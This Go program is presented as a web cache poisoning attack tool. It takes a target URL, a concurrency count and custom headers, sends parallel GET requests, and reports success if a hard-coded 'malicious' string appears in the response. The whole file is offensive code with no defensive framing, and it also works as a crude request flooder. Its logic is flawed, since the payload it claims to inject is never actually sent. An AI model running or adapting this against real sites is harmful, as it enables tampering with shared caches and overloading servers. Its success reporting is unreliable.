package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
)

func main() {
	// Prompt the user to enter the target website URL
	fmt.Print("Enter your target website URL (including http/https): ")
	scanner := bufio.NewScanner(os.Stdin)
	scanner.Scan()
	targetURL := scanner.Text()

	// Prompt the user to enter the number of concurrent requests
	fmt.Print("Enter the number of concurrent requests: ")
	scanner.Scan()
	numRequestsStr := scanner.Text()

	// Convert numRequestsStr to integer
	numRequests, err := strconv.Atoi(numRequestsStr)
	if err != nil {
		fmt.Println("Invalid input for concurrency:", err)
		return
	}

	// Prompt the user to enter custom headers if any
	fmt.Println("Enter custom headers (if none, press Enter): ")
	headers := make(http.Header)
	for {
		fmt.Print("Header (key:value): ")
		scanner.Scan()
		headerInput := scanner.Text()
		if headerInput == "" {
			break
		}
		parts := strings.SplitN(headerInput, ":", 2)
		if len(parts) != 2 {
			fmt.Println("Invalid header format. Please use key:value format.")
			continue
		}
		headers.Add(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]))
	}

	// Create a channel to communicate results
	results := make(chan string)

	// Wait group for synchronization
	var wg sync.WaitGroup

	// Define the payload to inject into the cache
	maliciousPayload := "Malicious content to be injected"

	// Send concurrent requests
	for i := 0; i < numRequests; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			// Craft the request
			req, err := http.NewRequest("GET", targetURL, nil)
			if err != nil {
				results <- "Error creating request: " + err.Error()
				return
			}

			// Add custom headers
			for key, values := range headers {
				for _, value := range values {
					req.Header.Add(key, value)
				}
			}

			// Send the request
			client := &http.Client{}
			resp, err := client.Do(req)
			if err != nil {
				results <- "Error sending request: " + err.Error()
				return
			}
			defer resp.Body.Close()

			// Read the response body
			body, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				results <- "Error reading response body: " + err.Error()
				return
			}

			// Check if the response contains the injected payload
			if strings.Contains(string(body), maliciousPayload) {
				results <- "Cache poisoning successful!"
			} else {
				results <- "Cache poisoning failed."
			}
		}()
	}

	// Close the channel when all goroutines are done
	go func() {
		wg.Wait()
		close(results)
	}()

	// Print results
	for res := range results {
		fmt.Println(res)
	}
}
